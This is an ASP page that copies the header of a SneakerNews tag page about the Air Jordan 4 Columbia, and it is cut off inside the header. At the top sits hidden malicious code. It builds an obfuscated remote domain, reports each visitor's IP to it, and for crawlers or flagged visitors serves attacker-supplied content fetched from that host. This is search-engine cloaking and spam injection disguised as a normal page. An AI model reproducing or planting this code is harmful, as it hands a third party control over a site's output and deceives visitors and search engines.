<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>


<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <!--<![endif]-->
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width" />
        <meta name="msapplication-TileColor" content="#FFFFFF">
        <meta name="msapplication-TileColor" content="#FFFFFF">
        <meta name="msapplication-TileImage" content="http://sneakernews.com/wp-content/themes/sneakernews/images/favicon-144.png">
        <meta name="msapplication-config" content="http://sneakernews.com/wp-content/themes/sneakernews/images/browserconfig.xml">
        <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <!-- favicons -->
        <link rel="shortcut icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon_icon.png">
        <link rel="apple-touch-icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon_icon.png">
        <link rel="shortcut icon" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon.ico">
        <link rel="icon" sizes="16x16 32x32 64x64" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon.ico">
        <link rel="icon" type="image/png" sizes="196x196" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-196.png">
        <link rel="icon" type="image/png" sizes="160x160" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-160.png">
        <link rel="icon" type="image/png" sizes="96x96" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-96.png">
        <link rel="icon" type="image/png" sizes="64x64" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-64.png">
        <link rel="icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-32.png" >
        <link rel="icon" type="image/png" sizes="16x16" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-16.png">
        <link rel="apple-touch-icon" sizes="152x152" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-152.png">
        <link rel="apple-touch-icon" sizes="144x144" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-144.png">
        <link rel="apple-touch-icon" sizes="120x120" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-120.png">
        <link rel="apple-touch-icon" sizes="114x114" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-114.png">
        <link rel="apple-touch-icon" sizes="76x76" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-76.png">
        <link rel="apple-touch-icon" sizes="72x72" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-72.png">
        <link rel="apple-touch-icon" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-57.png">
        <!-- favicon end -->
        <title>Air Jordan 4 Columbia - SneakerNews.com</title>
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="stylesheet" type="text/css" media="all" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/style.css" />
        <link rel="pingback" href="http://sneakernews.com/xmlrpc.php" />
        <!--[if lt IE 9]>
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/html5.js" type="text/javascript"></script>
        <![endif]-->
        <!--start menu CSS-->
        <link rel="stylesheet" type="text/css" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/css/flexnav.css" /	>
              <!--End menu CSS-->
              <!--start bxSlider CSS file -->
              <link href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/css/jquery.bxslider.css" rel="stylesheet" />
        <!--end bxSlider CSS file -->
        <link href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/mediatag.css" type="text/css" rel="stylesheet" />

        <!-- jQuery library (served from Google) -->
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.min.js"></script>
        <!-- bxSlider Javascript file -->
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.bxslider.min.js"></script>
        <!-- start menu JS -->
        <script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.6.2/modernizr.min.js"></script>
        <script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.flexnav.min.js"></script>
        <script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.flexnav.js"></script>
		<script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/cssua.min.js"></script>
        <!-- End menu JS -->

        <script type="text/javascript">
            var $ = jQuery;
            (function($) {
                $(document).ready(function() {
                    $(".flexnav").flexNav();
                    $('nav ul li ul.sub-menu li:first').addClass('first');
                    $('nav ul li ul.sub-menu li:last').addClass('first');
                    
					$('nav ul li').each(function() {
                       var subclass = $(this).find('a:first').text().toLowerCase();
                       var sub1 = subclass.replace(/ /g, "-");
                       $(this).addClass(sub1);
                    });
                });
            })(jQuery);


            //End menu js
        </script>
        
<!-- This site is optimized with the Yoast WordPress SEO plugin v1.5.3.3 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="The Air Jordan 4 Columbia was one of the first ever non-original colorways created for the Air Jordan 4. The Columbia 4s will be re-released January 10th, 2015 as part of Jordan Brand&#039;s remastered effort. Click in for Air Jordan 4 Columbia photos, info, and release date."/>
<link rel="canonical" href="http://sneakernews.com/tag/air-jordan-4-columbia/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="object" />
<meta property="og:title" content="Air Jordan 4 Columbia - SneakerNews.com" />
<meta property="og:description" content="The Air Jordan 4 Columbia was one of the first ever non-original colorways created for the Air Jordan 4. The Columbia 4s will be re-released January 10th, 2015 as part of Jordan Brand&#039;s remastered effort." />
<meta property="og:url" content="http://sneakernews.com/tag/air-jordan-4-columbia/" />
<meta property="og:site_name" content="Sneaker News" />
<!-- / Yoast WordPress SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Feed" href="http://sneakernews.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Comments Feed" href="http://sneakernews.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Air Jordan 4 Columbia Tag Feed" href="http://sneakernews.com/tag/air-jordan-4-columbia/feed/" />
	  <style type="text/css">
	  .wp-pagenavi{margin-left:auto !important; margin-right:auto; !important}

	  .wp-pagenavi a,.wp-pagenavi a:link,.wp-pagenavi a:visited,.wp-pagenavi a:active,.wp-pagenavi span.extend {    }
	  .wp-pagenavi a:hover,.wp-pagenavi span.current
	  {
		     
	  }
	  .wp-pagenavi span.pages {  }
	  </style>
	  <link rel='stylesheet' id='nextgen_gallery_related_images-css'  href='http://cdn.sneakernews.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/nextgen_gallery_display/static/nextgen_gallery_related_images.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='pinterest-pin-it-button-plugin-styles-css'  href='http://cdn.sneakernews.com/wp-content/plugins/pinterest-pin-it-button/css/public.css?ver=2.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='wp-postratings-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-css.css?ver=1.79' type='text/css' media='all' />
<link rel='stylesheet' id='wp125style-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp125/wp125.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-widgets-css'  href='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/widgets/widgets.css?ver=20121003' type='text/css' media='all' />
<link rel='stylesheet' id='wp-paginate-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-paginate/wp-paginate.css?ver=1.2.5' type='text/css' media='screen' />
<link rel='stylesheet' id='avhec-widget-css'  href='http://cdn.sneakernews.com/wp-content/plugins/extended-categories-widget/3.3/css/avh-ec.widget.css?ver=3.6.7' type='text/css' media='all' />
<link rel='stylesheet' id='wp-pagenavi-style-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-pagenavi-style/style/default.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var photocrati_ajax = {"url":"http:\/\/sneakernews.com\/photocrati_ajax","wp_site_url":"http:\/\/sneakernews.com","wp_site_static_url":"http:\/\/sneakernews.com"};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ajax/static/ajax.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://zor.livefyre.com/wjs/v3.0/javascripts/livefyre.js'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://sneakernews.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://sneakernews.com/wp-includes/wlwmanifest.xml" /> 

    <!-- cmnUNT | Begin head script -->
    <script data-cfasync="false" type="text/javascript">
        var isMobile = /iPhone|iPod|BlackBerry|Opera Mini|(android|bb\d+|meego).+mobile/i.test(navigator.userAgent);
        if (isMobile) {
            cmnunt_site = "cmn_sneakernews_mob"; //set in admin
        } else {
            cmnunt_site = "cmn_sneakernews"; //set in admin
        }
        cmnunt_silo     = 's_sne'; //set in admin
        cmnunt_subsilo  = '';
        cmnunt_tier     = 'to,t2,subhome';
        cmnunt_zone     = 'blog';
        cmnunt_kw       = '';
        cmnunt_exclude  = '';
        cmn_tb_theme    = 'default';
        if (isMobile) {
            document.write('<scr'+'ipt src="http://cdn.complexmedianetwork.com/js/cmnUNTmobile.js"></scr'+'ipt>');
        } else {
            document.write('<scr'+'ipt src="http://cdn.complexmedianetwork.com/js/cmnUNT.js"></scr'+'ipt>');
        }
    </script>
    
    <!-- cmnUNT | Header Unit Centering Styles -->
    <link rel="stylesheet" type="text/css" href="http://cdn.sneakernews.com/wp-content/plugins/cm-ad-map 2/dist/css/cmn_styles.css" />
    <!-- <meta name="NextGEN" version="2.0.21" /> -->
<script type="text/javascript">(function(){var po = document.createElement("script");po.type = "text/javascript"; po.async = true;po.src = "https://apis.google.com/js/plusone.js";var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(po, s);})();</script><link rel='stylesheet' type='text/css' href='http://cdn.sneakernews.com/wp-content/plugins/wp-mashsocial-wigdet/cssstyles.css' />
	<style type="text/css">
	 .wp-pagenavi
	{
		font-size:12px !important;
	}
	</style>
	<!-- Vipers Video Quicktags v6.5.2 | http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/ -->
<style type="text/css">
.vvqbox { display: block; max-width: 100%; visibility: visible !important; margin: 10px auto; } .vvqbox img { max-width: 100%; height: 100%; } .vvqbox object { max-width: 100%; } 
</style>
<script type="text/javascript">
// <![CDATA[
	var vvqflashvars = {};
	var vvqparams = { wmode: "opaque", allowfullscreen: "true", allowscriptaccess: "always" };
	var vvqattributes = {};
	var vvqexpressinstall = "http://sneakernews.com/wp-content/plugins/vipers-video-quicktags/resources/expressinstall.swf";
// ]]>
</script>
        <script type="text/javascript">

            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-149082-11']);
            _gaq.push(['_trackPageview']);

            (function() {
                var ga = document.createElement('script');
                ga.type = 'text/javascript';
                ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
                var s = document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(ga, s);
            })();

        </script>
        <script src="https://apis.google.com/js/platform.js" async defer></script>
		
    	  <style type="text/css">
	  .wp-pagenavi{margin-left:auto !important; margin-right:auto; !important}

	  .wp-pagenavi a,.wp-pagenavi a:link,.wp-pagenavi a:visited,.wp-pagenavi a:active,.wp-pagenavi span.extend {    }
	  .wp-pagenavi a:hover,.wp-pagenavi span.current
	  {
		     
	  }
	  .wp-pagenavi span.pages {  }
	  </style>
	  </head>

    <body class="archive tag tag-air-jordan-4-columbia tag-7764">
        <!--main-->
        <div id="fb-root"></div>		

        <!-- cmnUNT | Begin ad tag-->
        <div id="cmn_ad_tag_head" style="background:#fafafa;" class="fw_sneakernews">
            <script type="text/javascript">cmnUNT('3x3', tile_num++);</script>
        </div>
        <!-- cmnUNT | End ad tag -->



        <div id="sneaker-news-main">
            <!--header-->
            <header>
                                <div class="logo-main">
                    <div class="wrapper">
                        <div class="sneaker-news-top">
                            <div class="sneaker-logo"><a href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo.png" alt="Sneaker News" /> <img class="for-mobile" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png" alt="Sneaker News" /> </a></div>
                        </div>
                    </div>
                </div>
                <div class="sneaker-nav"> 
                    <div class="nav-main">
                        <div class="wrapper">   
                            <div class="nav-container">
                                <nav>
<div class="menu-primary-navigation-container"><ul id="menu-primary-navigation" class="menu"><li id="menu-item-355567" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-355567"><a href="http://sneakernews.com">Home</a></li>
<li id="menu-item-421511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-421511"><a href="http://sneakernews.com/magazine">Magazine</a></li>
<li id="menu-item-440551" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440551"><a href="http://sneakernews.com/category/select">SELECT</a></li>
<li id="menu-item-440520" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440520"><a href="http://sneakernews.com/air-jordan-release-dates/">Jordan Release Dates</a></li>
<li id="menu-item-440521" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440521"><a href="http://sneakernews.com/release-dates/">Sneaker Release Dates</a></li>
</ul></div>                                </nav>
                                <!--<nav>
                                    <ul>
                                        <li class="home"><a href="#">Home</a></li>
                                        <li><a href="#">Featured</a></li>
                                        <li><a href="#">Select </a></li>
                                        <li class="date-icon"><a href="#">jordan release dates</a></li>
                                        <li class="date-icon sneaker"><a href="#">sneaker release dates</a></li>
                                    </ul>
                                </nav>-->

                                <form method="get" id="searchform" action="http://sneakernews.com"> 
                                    <div>
                                        <input type="submit" class="submit" value="">
                                        <input type="hidden" id="searchsubmit"> 
                                        <input type="text" class="input search-box" placeholder="search"  name="s" id="s" onblur="if (this.value == '') {
                    this.value = 'Search';
                }" onfocus="if (this.value == 'Search') {
                    this.value = '';
                }">
                                    </div>
                                </form>

                            </div>       

                        </div>
                    </div>  
                </div>   <!--sneaker-nav-->
                <div class="sub-nav-main">
                    <div class="wrapper">
                        <div class="sub-nav-container">
                            <nav>
                                <ul>
<div class="menu-top-cats-container"><ul id="menu-top-cats" class="menu"><li id="menu-item-560031" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-560031"><a href="http://sneakernews.com/tag/air-jordan-4-columbia/">Columbia 4s</a></li>
<li id="menu-item-500955" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-500955"><a href="http://sneakernews.com/tag/nike-roshe-run/">Nike Roshe Run</a></li>
<li id="menu-item-508049" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-508049"><a href="http://sneakernews.com/tag/nike-huarache/">Nike Huarache</a></li>
<li id="menu-item-440536" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440536"><a href="http://sneakernews.com/category/air-jordan/">Jordans</a></li>
<li id="menu-item-440509" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440509"><a href="http://sneakernews.com/tag/lebron-12/">LeBron 12</a></li>
<li id="menu-item-440400" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440400"><a href="http://sneakernews.com/tag/nike-kd-7/">KD 7</a></li>
<li id="menu-item-440399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440399"><a href="http://sneakernews.com/tag/kobe-9/">Kobe 9</a></li>
<li id="menu-item-553793" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-553793"><a href="http://sneakernews.com/tag/nike-kyrie-1/">Kyrie 1</a></li>
<li id="menu-item-560030" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-560030"><a href="http://sneakernews.com/tag/air-jordan-xx3/">XX3</a></li>
<li id="menu-item-355579" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-355579"><a href="http://sneakernews.com/category/just-released/">Just Released</a></li>
<li id="menu-item-355578" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-355578"><a href="http://sneakernews.com/category/upcoming-sneakers/">Upcoming</a></li>
<li id="menu-item-550289" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-550289"><a href="#">Brands</a>
<ul class="sub-menu">
	<li id="menu-item-550290" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550290"><a href="/category/air-jordan/">Jordans</a></li>
	<li id="menu-item-550291" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550291"><a href="/?s=nike">nike</a></li>
	<li id="menu-item-550292" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550292"><a href="/category/adidas/">adidas</a></li>
	<li id="menu-item-550293" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550293"><a href="/category/reebok/">reebok</a></li>
	<li id="menu-item-550294" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550294"><a href="/category/asics/">asics</a></li>
	<li id="menu-item-550295" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550295"><a href="/category/new-balance/">new balance</a></li>
	<li id="menu-item-550296" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550296"><a href="/category/vans/">vans</a></li>
	<li id="menu-item-550297" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550297"><a href="/category/saucony/">saucony</a></li>
	<li id="menu-item-550298" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550298"><a href="/category/converse/">converse</a></li>
	<li id="menu-item-550299" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550299"><a href="/category/puma/">puma</a></li>
	<li id="menu-item-550301" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550301"><a href="/category/supra/">supra</a></li>
	<li id="menu-item-550302" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550302"><a href="http://sneakernews.com/tag/under-armour/">under armour</a></li>
</ul>
</li>
</ul></div>                                </ul>
                            </nav>
                        </div>
                    </div>
                </div>  

                <div class="sneaker-responsive-menu">
                    <div class="menu-button"><span class="touch-button"><i class="navicon-big"></i></span></div>
                    <ul data-breakpoint="800" class="tech-nav flexnav">
                        <li>
                            <form method="get" id="searchform" action="http://sneakernews.com"> 
                                <div class="search-box-main">
                                    <input type="submit" class="submit" value="" hidden="">
                                    <input type="hidden" id="searchsubmit"> 
                                    <input type="text" class="input search-box" placeholder="search"  name="s" id="s" onblur="if (this.value == '') {
                    this.value = 'Search';
                }" onfocus="if (this.value == 'Search') {
                    this.value = '';
                }">
                                </div>
                            </form>
                        </li>
                        <li><a href="/">Home</a></li>
                        <li><a href="/magazine/">Magazine</a></li>
                        <li><a href="/category/select/">Select</a></li>
                        <li><a href="/air-jordan-release-dates/">jordan release dates</a></li>
                        <li><a href="/release-dates/">sneaker release dates</a></li>
                        <li class="categories"><a href="#">categories<i></i></a>
                            <ul>
                                <li>         
                                    <select name='cat_menu' id='cat_menu' class='postform' >
	<option value='-1'>ALL</option>
	<option class="level-0" value="24">Adidas&nbsp;&nbsp;(4,205)</option>
	<option class="level-0" value="20">Air Classic BW&nbsp;&nbsp;(208)</option>
	<option class="level-0" value="12">Air Jordan&nbsp;&nbsp;(10,480)</option>
	<option class="level-0" value="206">Air Jordan Force Fusion&nbsp;&nbsp;(235)</option>
	<option class="level-0" value="15">Air Max 1&nbsp;&nbsp;(1,194)</option>
	<option class="level-0" value="9">Air Max 360&nbsp;&nbsp;(86)</option>
	<option class="level-0" value="6">Air Max 90&nbsp;&nbsp;(1,260)</option>
	<option class="level-0" value="19">Air Max 95&nbsp;&nbsp;(525)</option>
	<option class="level-0" value="47">Air Max 97&nbsp;&nbsp;(172)</option>
	<option class="level-0" value="57">Air Max Light&nbsp;&nbsp;(150)</option>
	<option class="level-0" value="41">Air Stab&nbsp;&nbsp;(31)</option>
	<option class="level-0" value="68">Air Structure&nbsp;&nbsp;(79)</option>
	<option class="level-0" value="273">Air Yeezy&nbsp;&nbsp;(325)</option>
	<option class="level-0" value="44">Alife&nbsp;&nbsp;(108)</option>
	<option class="level-0" value="39">Asia Exclusive&nbsp;&nbsp;(495)</option>
	<option class="level-0" value="42">Asics&nbsp;&nbsp;(835)</option>
	<option class="level-0" value="27">Bape&nbsp;&nbsp;(85)</option>
	<option class="level-0" value="21">Basketball&nbsp;&nbsp;(8,058)</option>
	<option class="level-0" value="4">Blazer&nbsp;&nbsp;(959)</option>
	<option class="level-0" value="272">Celebrity Feet&nbsp;&nbsp;(1,864)</option>
	<option class="level-0" value="16">Clothing&nbsp;&nbsp;(350)</option>
	<option class="level-0" value="43">Collaboration&nbsp;&nbsp;(6,518)</option>
	<option class="level-0" value="271">Collections&nbsp;&nbsp;(226)</option>
	<option class="level-0" value="70">Converse&nbsp;&nbsp;(1,043)</option>
	<option class="level-0" value="25">Court Force&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="285">Customs&nbsp;&nbsp;(1,281)</option>
	<option class="level-0" value="61">DC Shoes&nbsp;&nbsp;(67)</option>
	<option class="level-0" value="3">Dope Kicks&nbsp;&nbsp;(68)</option>
	<option class="level-0" value="11">Dunk&nbsp;&nbsp;(2,765)</option>
	<option class="level-0" value="283">Dwyane Wade&nbsp;&nbsp;(466)</option>
	<option class="level-0" value="205">eBay&nbsp;&nbsp;(2,867)</option>
	<option class="level-0" value="64">Europe Exclusive&nbsp;&nbsp;(343)</option>
	<option class="level-0" value="270">Events&nbsp;&nbsp;(1,071)</option>
	<option class="level-0" value="4625">Featured&nbsp;&nbsp;(2,420)</option>
	<option class="level-0" value="7337">Featured Stories&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="50">Finishline&nbsp;&nbsp;(360)</option>
	<option class="level-0" value="48">Footscape&nbsp;&nbsp;(169)</option>
	<option class="level-0" value="35">Gear&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="284">Giveaway&nbsp;&nbsp;(42)</option>
	<option class="level-0" value="287">Griffey&nbsp;&nbsp;(209)</option>
	<option class="level-0" value="207">House of Hoops&nbsp;&nbsp;(301)</option>
	<option class="level-0" value="34">Hybrid&nbsp;&nbsp;(1,360)</option>
	<option class="level-0" value="73">Hyperdunk&nbsp;&nbsp;(736)</option>
	<option class="level-0" value="29">Japanese Brands&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="204">JD Sports&nbsp;&nbsp;(243)</option>
	<option class="level-0" value="1">Just Released&nbsp;&nbsp;(13,804)</option>
	<option class="level-0" value="282">Kevin Durant&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="52">Kids&nbsp;&nbsp;(608)</option>
	<option class="level-0" value="209">Kobe&nbsp;&nbsp;(2,089)</option>
	<option class="level-0" value="1282">Kyrie Irving&nbsp;&nbsp;(30)</option>
	<option class="level-0" value="22">LeBron&nbsp;&nbsp;(3,326)</option>
	<option class="level-0" value="217">Lifestyle Sneakers&nbsp;&nbsp;(2,992)</option>
	<option class="level-0" value="28">New Balance&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="63">Nike 6.0&nbsp;&nbsp;(114)</option>
	<option class="level-0" value="71">Nike ACG&nbsp;&nbsp;(493)</option>
	<option class="level-0" value="7">Nike Air Force 1s&nbsp;&nbsp;(2,914)</option>
	<option class="level-0" value="5">Nike Air Max&nbsp;&nbsp;(5,028)</option>
	<option class="level-0" value="288">Nike Air Penny&nbsp;&nbsp;(680)</option>
	<option class="level-0" value="90">Nike Boots&nbsp;&nbsp;(253)</option>
	<option class="level-0" value="3101">Nike Flyknit&nbsp;&nbsp;(428)</option>
	<option class="level-0" value="280">Nike Foamposite&nbsp;&nbsp;(1,339)</option>
	<option class="level-0" value="51">Nike Force&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="208">Nike Free&nbsp;&nbsp;(815)</option>
	<option class="level-0" value="6974">Nike Huarache&nbsp;&nbsp;(352)</option>
	<option class="level-0" value="40">Nike iD&nbsp;&nbsp;(944)</option>
	<option class="level-0" value="286">Nike Lunar&nbsp;&nbsp;(1,111)</option>
	<option class="level-0" value="58">Nike Retro&nbsp;&nbsp;(3,529)</option>
	<option class="level-0" value="5781">Nike Roshe&nbsp;&nbsp;(503)</option>
	<option class="level-0" value="10">Nike SB&nbsp;&nbsp;(2,841)</option>
	<option class="level-0" value="36">NikeStore&nbsp;&nbsp;(717)</option>
	<option class="level-0" value="56">P-Rod&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="23">PE&nbsp;&nbsp;(2,478)</option>
	<option class="level-0" value="31">Promo&nbsp;&nbsp;(682)</option>
	<option class="level-0" value="62">Puma&nbsp;&nbsp;(646)</option>
	<option class="level-0" value="49">Reebok&nbsp;&nbsp;(2,006)</option>
	<option class="level-0" value="6300">Release Dates&nbsp;&nbsp;(715)</option>
	<option class="level-0" value="38">Running&nbsp;&nbsp;(3,637)</option>
	<option class="level-0" value="8">Sample&nbsp;&nbsp;(1,637)</option>
	<option class="level-0" value="535">Saucony&nbsp;&nbsp;(283)</option>
	<option class="level-0" value="6021">Select&nbsp;&nbsp;(106)</option>
	<option class="level-0" value="30">Shoes&nbsp;&nbsp;(63)</option>
	<option class="level-0" value="69">Skate&nbsp;&nbsp;(3,235)</option>
	<option class="level-0" value="162">Supra&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="215">Terminator&nbsp;&nbsp;(143)</option>
	<option class="level-0" value="4132">Top Categories&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="14">Toys&nbsp;&nbsp;(39)</option>
	<option class="level-0" value="33">Trainer&nbsp;&nbsp;(1,547)</option>
	<option class="level-0" value="66">Upcoming Sneakers&nbsp;&nbsp;(23,149)</option>
	<option class="level-0" value="53">Vandal&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="32">Vans&nbsp;&nbsp;(1,459)</option>
	<option class="level-0" value="37">Vintage&nbsp;&nbsp;(573)</option>
	<option class="level-0" value="82">Visvim&nbsp;&nbsp;(40)</option>
	<option class="level-0" value="279">Weekly Rewind&nbsp;&nbsp;(264)</option>
	<option class="level-0" value="26">WMNS&nbsp;&nbsp;(1,602)</option>
</select>
                                    <script type="text/javascript">
            var dropdown = document.getElementById("cat_menu");
            function onCatChange() {
                if (dropdown.options[dropdown.selectedIndex].value > 0) {
                    location.href = "/?cat=" + dropdown.options[dropdown.selectedIndex].value;
                }
            }
            dropdown.onchange = onCatChange;
                                    </script>
                                </li>
                                <li>
                                    <select id="brand_menu"><option value="brand">BRANDS</option><option value="/category/air-jordan/">Jordans</option>
<option value="/?s=nike">nike</option>
<option value="/category/adidas/">adidas</option>
<option value="/category/reebok/">reebok</option>
<option value="/category/asics/">asics</option>
<option value="/category/new-balance/">new balance</option>
<option value="/category/vans/">vans</option>
<option value="/category/saucony/">saucony</option>
<option value="/category/converse/">converse</option>
<option value="/category/puma/">puma</option>
<option value="/category/supra/">supra</option>
<option value="http://sneakernews.com/tag/under-armour/">under armour</option>
</select>                                    <script type="text/javascript">
                                        var dropdown_brand = document.getElementById("brand_menu");
                                        var site_url = 'http://sneakernews.com/';
                                        function onBrandChange() {
                                            if (dropdown_brand.options[dropdown_brand.selectedIndex].value != 'brand') {
                                                location.href = site_url + dropdown_brand.options[dropdown_brand.selectedIndex].value;
                                            }
                                        }
                                        dropdown_brand.onchange = onBrandChange;
                                    </script>
                                </li>
                                <li><a href="/tag/lebron-12/">LeBron 12</a></li>
                                <li><a href="/tag/air-jordan-xx9/">Air Jordan XX9</a></li>
                                <li><a href="/tag/nike-kd-7/">kd 7</a></li>
                                <li><a href="/tag/nike-roshe-run/">Roshe Run</a></li>
                                <li><a href="/category/air-jordan/">Jordans</a></li>
                                <li><a href="/tag/kobe-9/">Kobe 9</a></li>
                                <li><a href="/category/adidas/">Adidas</a></li>
                                <li><a href="/category/just-released/">Just Released</a></li>
                                <li><a href="/category/upcoming-sneakers/">Upcoming</a></li>
                            </ul>
                        </li>
                        <li><a href="/air-jordan-brand-jordan/">air jordan history</a></li>
                        <li><a href="/nike-sb-skateboarding/">nike sb archive</a></li>
                    </ul>	
                </div>
            </header> 
            <!--header-->
						<!-- open cmn_wrap -->
